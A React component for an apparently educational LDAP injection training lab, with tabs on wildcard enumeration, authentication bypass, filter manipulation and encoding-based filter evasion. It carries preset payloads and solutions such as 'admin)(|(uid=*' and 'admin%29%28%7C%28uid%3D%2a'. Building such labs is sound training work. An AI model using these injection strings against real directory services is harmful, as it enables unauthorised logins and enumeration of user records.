import { useState, useRef, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from '@/components/ui/collapsible';
import { Zap, Shield, ChevronDown, User, Key, AlertTriangle, CheckCircle, Search, Filter, Database } from 'lucide-react';

interface LdapResult {
  success?: boolean;
  authenticated?: boolean;
  users?: Array<{
    cn?: string;
    uid?: string;
    mail?: string;
    department?: string;
    role?: string;
    dn?: string;
  }>;
  user?: {
    cn?: string;
    uid?: string;
    mail?: string;
    department?: string;
    role?: string;
  };
  error?: string;
  message?: string;
  flag?: string;
  ldap_injection?: {
    detected: boolean;
    payload: string;
    filter_used: string;
    records_returned: number;
    technique: string;
  };
  admin_access?: boolean;
}

export default function LdapInjectionLab() {
  const [activeTab, setActiveTab] = useState('intro');
  const [isHardMode, setIsHardMode] = useState(false);
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<LdapResult | null>(null);
  const [solutionStates, setSolutionStates] = useState<Record<string, boolean>>({
    wildcard: false,
    boolean: false,
    filter: false,
    bypass: false
  });
  const resultsRef = useRef<HTMLDivElement>(null);
  
  const toggleSolution = (technique: string) => {
    setSolutionStates(prev => ({ ...prev, [technique]: !prev[technique] }));
  };
  
  const [usernameInput, setUsernameInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [filterInput, setFilterInput] = useState('');
  const [searchInput, setSearchInput] = useState('');

  useEffect(() => {
    if (result && resultsRef.current) {
      resultsRef.current.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
  }, [result]);

  const executeQuery = async (params: Record<string, string>) => {
    setLoading(true);
    setResult(null);
    
    try {
      const queryParams = new URLSearchParams({
        ...params,
        ...(isHardMode ? { mode: 'hard' } : {})
      });
      
      const response = await fetch(`/api/vuln/ldap-injection?${queryParams}`);
      const data = await response.json();
      setResult(data);
    } catch (error) {
      setResult({ error: 'Network error - LDAP server unreachable' });
    } finally {
      setLoading(false);
    }
  };

  const renderResults = () => {
    if (!result) return null;
    
    if (result.error) {
      return (
        <div ref={resultsRef} className="mt-4 p-4 bg-red-950/50 border border-red-500/50 rounded-lg">
          <div className="flex items-center gap-2 text-red-400 font-semibold mb-2">
            <AlertTriangle size={18} />
            LDAP Query Failed
          </div>
          <p className="text-red-300 text-sm">{result.error}</p>
        </div>
      );
    }

    const hasInjection = result.ldap_injection?.detected;

    return (
      <div ref={resultsRef} className="mt-4 space-y-3">
        {result.flag && (
          <div className="p-4 bg-green-950/50 border border-green-500/50 rounded-lg">
            <div className="flex items-center gap-2 text-green-400 font-semibold mb-2">
              <CheckCircle size={18} />
              LDAP Injection Successful!
            </div>
            <code className="text-green-300 bg-green-900/30 px-2 py-1 rounded">{result.flag}</code>
          </div>
        )}
        
        {hasInjection && (
          <div className="p-4 bg-violet-950/30 border border-violet-600/30 rounded-lg">
            <div className="flex items-center gap-2 text-violet-400 font-semibold mb-2">
              <Database size={18} />
              LDAP Injection Detected!
            </div>
            <div className="grid grid-cols-2 gap-3 text-sm mt-3">
              <div className="p-2 bg-slate-800/50 rounded">
                <div className="text-slate-500 text-xs">Technique</div>
                <div className="text-white font-mono">{result.ldap_injection?.technique}</div>
              </div>
              <div className="p-2 bg-slate-800/50 rounded border-l-2 border-violet-500">
                <div className="text-slate-500 text-xs">Records Returned</div>
                <div className="text-violet-400 font-mono">{result.ldap_injection?.records_returned}</div>
              </div>
            </div>
            <div className="mt-3 p-2 bg-slate-800/50 rounded">
              <div className="text-slate-500 text-xs mb-1">Filter Used</div>
              <code className="text-violet-300 text-xs break-all">{result.ldap_injection?.filter_used}</code>
            </div>
          </div>
        )}

        {result.authenticated && (
          <div className="p-4 bg-green-950/30 border border-green-600/30 rounded-lg">
            <div className="flex items-center gap-2 text-green-400 font-semibold mb-2">
              <CheckCircle size={18} />
              Authentication Bypassed!
            </div>
            <p className="text-green-300 text-sm">Successfully authenticated without valid credentials.</p>
          </div>
        )}
        
        {result.admin_access && (
          <div className="p-4 bg-purple-950/30 border border-purple-600/30 rounded-lg">
            <div className="flex items-center gap-2 text-purple-400 font-semibold mb-2">
              <Key size={18} />
              Admin Directory Access Granted
            </div>
            <p className="text-purple-300 text-sm">You have access to privileged directory objects!</p>
          </div>
        )}
        
        {result.users && result.users.length > 0 && (
          <div className="p-4 bg-slate-900/50 border border-slate-600/50 rounded-lg">
            <h4 className="text-[#B14EFF] font-semibold text-sm mb-3 flex items-center gap-2">
              <User size={14} />
              Directory Entries ({result.users.length} found)
            </h4>
            <div className="space-y-2 max-h-60 overflow-y-auto">
              {result.users.map((user, idx) => (
                <div key={idx} className="p-2 bg-slate-800/50 rounded text-sm border border-slate-700/50">
                  <div className="grid grid-cols-2 gap-2 text-xs">
                    {user.cn && (
                      <div>
                        <span className="text-slate-500">CN:</span>
                        <span className="text-white ml-1">{user.cn}</span>
                      </div>
                    )}
                    {user.uid && (
                      <div>
                        <span className="text-slate-500">UID:</span>
                        <span className="text-white ml-1">{user.uid}</span>
                      </div>
                    )}
                    {user.mail && (
                      <div>
                        <span className="text-slate-500">Email:</span>
                        <span className="text-white ml-1">{user.mail}</span>
                      </div>
                    )}
                    {user.department && (
                      <div>
                        <span className="text-slate-500">Dept:</span>
                        <span className="text-white ml-1">{user.department}</span>
                      </div>
                    )}
                    {user.role && (
                      <div className="col-span-2">
                        <span className="text-slate-500">Role:</span>
                        <Badge variant="outline" className={user.role === 'admin' ? 'ml-1 border-yellow-500 text-yellow-400' : 'ml-1'}>
                          {user.role}
                        </Badge>
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {result.user && (
          <div className="p-4 bg-slate-900/50 border border-slate-600/50 rounded-lg">
            <h4 className="text-[#B14EFF] font-semibold text-sm mb-3 flex items-center gap-2">
              <User size={14} />
              User Entry
            </h4>
            <div className="space-y-2 text-sm">
              {result.user.cn && (
                <div className="flex items-center gap-2">
                  <span className="text-slate-500 w-24">CN:</span>
                  <span className="text-white">{result.user.cn}</span>
                </div>
              )}
              {result.user.uid && (
                <div className="flex items-center gap-2">
                  <span className="text-slate-500 w-24">UID:</span>
                  <span className="text-white font-mono">{result.user.uid}</span>
                </div>
              )}
              {result.user.mail && (
                <div className="flex items-center gap-2">
                  <span className="text-slate-500 w-24">Email:</span>
                  <span className="text-white">{result.user.mail}</span>
                </div>
              )}
              {result.user.role && (
                <div className="flex items-center gap-2">
                  <span className="text-slate-500 w-24">Role:</span>
                  <Badge variant="outline" className={result.user.role === 'admin' ? 'border-yellow-500 text-yellow-400' : ''}>
                    {result.user.role}
                  </Badge>
                </div>
              )}
            </div>
          </div>
        )}

        {result.message && !result.error && (
          <div className="p-3 bg-slate-800/50 border border-slate-600/50 rounded text-sm text-slate-300">
            {result.message}
          </div>
        )}
      </div>
    );
  };

  return (
    <div className="cyber-card border border-[#B14EFF]/30 mb-6 bg-gradient-to-br from-violet-950/20 to-[#0A0A14]">
      <div className="bg-gradient-to-r from-violet-950/40 to-[#0D0D14] border-b border-[#B14EFF]/30 px-6 py-5">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-xl font-bold flex items-center">
              <span className="text-[#B14EFF]">LDAP Injection Lab</span>
              <Badge className="ml-3 bg-[#B14EFF]/20 text-[#B14EFF] border-[#B14EFF]/30">Directory Services</Badge>
            </h2>
            <p className="text-gray-400 mt-1 text-sm">
              Exploit vulnerable LDAP queries to bypass authentication and enumerate directory data
            </p>
          </div>
          <div className="flex gap-2">
            <Button 
              size="sm"
              variant={!isHardMode ? "default" : "outline"}
              className={!isHardMode ? "bg-[#B14EFF] hover:bg-[#B14EFF]/80" : "border-[#B14EFF]/50 text-[#B14EFF]"}
              onClick={() => setIsHardMode(false)}
            >
              <Zap size={16} className="mr-1" />
              Easy
            </Button>
            <Button 
              size="sm"
              variant={isHardMode ? "default" : "outline"}
              className={isHardMode ? "bg-violet-800 hover:bg-violet-700" : "border-violet-800/50 text-[#B14EFF]"}
              onClick={() => setIsHardMode(true)}
            >
              <Shield size={16} className="mr-1" />
              Hard
            </Button>
          </div>
        </div>
        {isHardMode && (
          <div className="mt-3 p-2 bg-violet-900/30 border border-[#B14EFF]/30 rounded text-xs text-violet-300">
            Enhanced Security - Basic wildcards blocked. Use advanced filter manipulation and encoding bypasses!
          </div>
        )}
      </div>
      
      <div className="p-6">
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="grid grid-cols-5 bg-slate-900/50">
            <TabsTrigger value="intro" className="text-xs">Mission</TabsTrigger>
            <TabsTrigger value="wildcard" className="text-xs">Wildcard Injection</TabsTrigger>
            <TabsTrigger value="boolean" className="text-xs">Boolean Bypass</TabsTrigger>
            <TabsTrigger value="filter" className="text-xs">Filter Manipulation</TabsTrigger>
            <TabsTrigger value="bypass" className="text-xs">Bypass</TabsTrigger>
          </TabsList>

          <TabsContent value="intro" className="mt-4">
            <Card className="bg-slate-900/50 border-[#B14EFF]/30">
              <CardHeader>
                <CardTitle className="text-[#B14EFF] flex items-center gap-2">
                  <Database size={20} />
                  Mission Briefing
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4 text-sm">
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h4 className="font-semibold text-white mb-2">Scenario</h4>
                  <p className="text-slate-300">
                    You have discovered a corporate application that uses <strong className="text-[#B14EFF]">LDAP (Lightweight Directory Access Protocol)</strong> for 
                    user authentication and directory lookups. The application constructs LDAP queries using unsanitized 
                    user input, making it vulnerable to injection attacks.
                  </p>
                </div>
                
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h4 className="font-semibold text-white mb-2">Your Objectives</h4>
                  <ol className="list-decimal list-inside space-y-2 text-slate-300">
                    <li><strong>Wildcard Injection:</strong> Use * characters to enumerate all users in the directory</li>
                    <li><strong>Boolean Bypass:</strong> Exploit OR conditions to bypass authentication</li>
                    <li><strong>Filter Manipulation:</strong> Inject malicious filter components to extract data</li>
                    <li><strong>Bypass:</strong> Evade input filters using encoding and alternate syntax</li>
                  </ol>
                </div>

                <div className="p-4 bg-violet-900/20 rounded-lg border border-[#B14EFF]/30">
                  <h4 className="font-semibold text-[#B14EFF] mb-2">How LDAP Injection Works</h4>
                  <p className="text-slate-300 text-xs">
                    LDAP Injection occurs when user input is concatenated into LDAP filter strings without proper 
                    sanitization. Attackers can inject special characters like <code className="bg-slate-700 px-1 rounded">*</code>, 
                    <code className="bg-slate-700 px-1 rounded">)</code>, <code className="bg-slate-700 px-1 rounded">(</code>, 
                    <code className="bg-slate-700 px-1 rounded">|</code>, and <code className="bg-slate-700 px-1 rounded">&</code> to 
                    modify query logic, bypass authentication, or extract sensitive directory information.
                  </p>
                  <div className="mt-2 p-2 bg-slate-800/50 rounded text-xs">
                    <span className="text-slate-500">Vulnerable filter:</span>
                    <code className="text-violet-300 ml-2">(&(uid=$USER)(password=$PASS))</code>
                  </div>
                </div>

                <Button 
                  className="w-full bg-[#B14EFF] hover:bg-[#B14EFF]/80"
                  onClick={() => setActiveTab('wildcard')}
                >
                  Start Lab - Wildcard Injection
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="wildcard" className="mt-4">
            <Card className="bg-slate-900/50 border-[#B14EFF]/30">
              <CardHeader>
                <CardTitle className="text-orange-400 flex items-center gap-2">
                  <Search size={20} />
                  Wildcard Injection
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>The LDAP search uses your input directly in the filter</li>
                    <li>Use the <code className="bg-slate-700 px-1 rounded">*</code> wildcard to match any characters</li>
                    <li>Try <code className="bg-slate-700 px-1 rounded">*</code> to enumerate all users</li>
                    <li>Use partial matches like <code className="bg-slate-700 px-1 rounded">admin*</code> to find admin accounts</li>
                  </ol>
                </div>

                <div className="p-3 bg-violet-950/30 border border-[#B14EFF]/30 rounded text-sm">
                  <div className="flex items-center gap-2 text-[#B14EFF] mb-1">
                    <Filter size={14} />
                    LDAP Filter Structure
                  </div>
                  <code className="text-slate-300 text-xs">(&(objectClass=person)(uid=$YOUR_INPUT))</code>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-slate-300">Username Search</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={searchInput}
                      onChange={(e) => setSearchInput(e.target.value)}
                      placeholder="Enter username (e.g., *, admin*, john)"
                      className="flex-1 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                    />
                    <Button 
                      onClick={() => executeQuery({ search: searchInput, type: 'wildcard' })}
                      disabled={loading}
                      className="bg-orange-600 hover:bg-orange-500"
                    >
                      {loading ? 'Searching...' : 'Search LDAP'}
                    </Button>
                  </div>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => { setSearchInput('*'); executeQuery({ search: '*', type: 'wildcard' }); }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    * (All Users)
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => { setSearchInput('admin*'); executeQuery({ search: 'admin*', type: 'wildcard' }); }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    admin*
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => { setSearchInput('*admin*'); executeQuery({ search: '*admin*', type: 'wildcard' }); }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    *admin*
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.wildcard} onOpenChange={() => toggleSolution('wildcard')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.wildcard ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.wildcard ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>All users:</strong> <code className="bg-slate-700 px-1 rounded">*</code></p>
                      <p className="text-slate-300"><strong>Admin accounts:</strong> <code className="bg-slate-700 px-1 rounded">admin*</code> or <code className="bg-slate-700 px-1 rounded">*admin*</code></p>
                      <p className="text-slate-300"><strong>Partial match:</strong> <code className="bg-slate-700 px-1 rounded">j*</code> finds john, jane, etc.</p>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="boolean" className="mt-4">
            <Card className="bg-slate-900/50 border-[#B14EFF]/30">
              <CardHeader>
                <CardTitle className="text-blue-400 flex items-center gap-2">
                  <Key size={20} />
                  Boolean Bypass (Authentication)
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>The login uses an LDAP filter to authenticate users</li>
                    <li>Inject OR conditions to bypass password verification</li>
                    <li>Close the filter and add always-true conditions</li>
                    <li>Goal: Authenticate as admin without knowing the password</li>
                  </ol>
                </div>

                <div className="p-3 bg-violet-950/30 border border-[#B14EFF]/30 rounded text-sm">
                  <div className="flex items-center gap-2 text-[#B14EFF] mb-1">
                    <Filter size={14} />
                    Authentication Filter
                  </div>
                  <code className="text-slate-300 text-xs">(&(uid=$USER)(userPassword=$PASS))</code>
                </div>

                <div className="space-y-3">
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-slate-300">Username</label>
                      <input
                        type="text"
                        value={usernameInput}
                        onChange={(e) => setUsernameInput(e.target.value)}
                        placeholder="Username or injection"
                        className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-slate-300">Password</label>
                      <input
                        type="text"
                        value={passwordInput}
                        onChange={(e) => setPasswordInput(e.target.value)}
                        placeholder="Password or injection"
                        className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                      />
                    </div>
                  </div>
                  <Button 
                    onClick={() => executeQuery({ username: usernameInput, password: passwordInput, type: 'auth' })}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-500"
                  >
                    {loading ? 'Authenticating...' : 'Login'}
                  </Button>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => { setUsernameInput('admin)(|(uid=*'); setPasswordInput('anything'); }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    OR Injection
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => { setUsernameInput('*)(uid=*))(|(uid=*'); setPasswordInput('x'); }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    Filter Break
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => { setUsernameInput('admin'); setPasswordInput('*'); }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    Wildcard Pass
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.boolean} onOpenChange={() => toggleSolution('boolean')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.boolean ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.boolean ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>Username:</strong> <code className="bg-slate-700 px-1 rounded">admin)(|(uid=*</code></p>
                      <p className="text-slate-300"><strong>Password:</strong> <code className="bg-slate-700 px-1 rounded">anything</code></p>
                      <p className="text-slate-300 text-xs mt-2">Resulting filter: <code className="bg-slate-700 px-1 rounded">(&(uid=admin)(|(uid=*)(userPassword=anything))</code></p>
                      <p className="text-slate-300 text-xs">The OR condition (|) with uid=* always matches, bypassing password check.</p>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="filter" className="mt-4">
            <Card className="bg-slate-900/50 border-[#B14EFF]/30">
              <CardHeader>
                <CardTitle className="text-purple-400 flex items-center gap-2">
                  <Filter size={20} />
                  Filter Manipulation
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>Inject custom LDAP filter components</li>
                    <li>Use attribute injection to query different fields</li>
                    <li>Extract data from protected attributes (role, department)</li>
                    <li>Chain multiple conditions to enumerate sensitive data</li>
                  </ol>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-slate-300">Custom Filter Injection</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={filterInput}
                      onChange={(e) => setFilterInput(e.target.value)}
                      placeholder="e.g., *)(objectClass=*"
                      className="flex-1 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                    />
                    <Button 
                      onClick={() => executeQuery({ filter: filterInput, type: 'filter' })}
                      disabled={loading}
                      className="bg-purple-600 hover:bg-purple-500"
                    >
                      {loading ? 'Injecting...' : 'Execute Filter'}
                    </Button>
                  </div>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => executeQuery({ filter: '*)(objectClass=*', type: 'filter' })} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    objectClass=*
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executeQuery({ filter: '*)(|(role=admin)', type: 'filter' })} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    role=admin
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executeQuery({ filter: '*)(department=IT', type: 'filter' })} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    department=IT
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executeQuery({ filter: '*)(&)(objectClass=*)(|(cn=*', type: 'filter' })} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    Extract All CNs
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.filter} onOpenChange={() => toggleSolution('filter')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.filter ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.filter ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>All objects:</strong> <code className="bg-slate-700 px-1 rounded">*)(objectClass=*</code></p>
                      <p className="text-slate-300"><strong>Admin roles:</strong> <code className="bg-slate-700 px-1 rounded">*)(|(role=admin)</code></p>
                      <p className="text-slate-300"><strong>Department enum:</strong> <code className="bg-slate-700 px-1 rounded">*)(department=*</code></p>
                      <p className="text-slate-300"><strong>Nested injection:</strong> <code className="bg-slate-700 px-1 rounded">*)(&amp;)(objectClass=*)(|(cn=*</code></p>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="bypass" className="mt-4">
            <Card className="bg-slate-900/50 border-[#B14EFF]/30">
              <CardHeader>
                <CardTitle className="text-green-400 flex items-center gap-2">
                  <Shield size={20} />
                  Security Bypass (Hard Mode)
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions (Enable Hard Mode!)</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>Switch to Hard Mode - basic wildcards and injections are filtered</li>
                    <li>Try URL encoding: %2a for *, %28 for (, %29 for )</li>
                    <li>Use null byte injection: %00 to truncate filters</li>
                    <li>Combine Unicode variants and alternate encodings</li>
                  </ol>
                </div>

                <div className="p-3 bg-yellow-900/20 border border-yellow-600/30 rounded text-sm">
                  <div className="flex items-center gap-2 text-yellow-400 mb-1">
                    <AlertTriangle size={14} />
                    Security Controls Active
                  </div>
                  <p className="text-slate-300 text-xs">
                    Input is being sanitized for: <code className="bg-slate-700 px-1 rounded">* ( ) | & ! = \ /</code>
                  </p>
                </div>

                <div className="space-y-3">
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-slate-300">Username (Encoded)</label>
                      <input
                        type="text"
                        value={usernameInput}
                        onChange={(e) => setUsernameInput(e.target.value)}
                        placeholder="Encoded payload"
                        className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-slate-300">Password (Encoded)</label>
                      <input
                        type="text"
                        value={passwordInput}
                        onChange={(e) => setPasswordInput(e.target.value)}
                        placeholder="Encoded payload"
                        className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                      />
                    </div>
                  </div>
                  <Button 
                    onClick={() => executeQuery({ username: usernameInput, password: passwordInput, type: 'bypass' })}
                    disabled={loading}
                    className="w-full bg-green-600 hover:bg-green-500"
                  >
                    {loading ? 'Attempting Bypass...' : 'Execute Bypass'}
                  </Button>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => { setUsernameInput('%2a'); setPasswordInput('%2a'); }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    URL Encoded *
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => { setUsernameInput('admin%00'); setPasswordInput('x'); }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    Null Byte
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => { setUsernameInput('admin%29%28%7C%28uid%3D%2a'); setPasswordInput('x'); }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    Full Encoded
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => { setUsernameInput('＊'); setPasswordInput('＊'); }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    Unicode *
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.bypass} onOpenChange={() => toggleSolution('bypass')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.bypass ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.bypass ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>URL encode:</strong> <code className="bg-slate-700 px-1 rounded">%2a</code> = *, <code className="bg-slate-700 px-1 rounded">%28</code> = (, <code className="bg-slate-700 px-1 rounded">%29</code> = )</p>
                      <p className="text-slate-300"><strong>Null byte:</strong> <code className="bg-slate-700 px-1 rounded">admin%00</code> truncates the filter</p>
                      <p className="text-slate-300"><strong>Full bypass:</strong> <code className="bg-slate-700 px-1 rounded">admin%29%28%7C%28uid%3D%2a</code></p>
                      <p className="text-slate-300"><strong>Unicode:</strong> <code className="bg-slate-700 px-1 rounded">＊</code> (fullwidth asterisk U+FF0A)</p>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
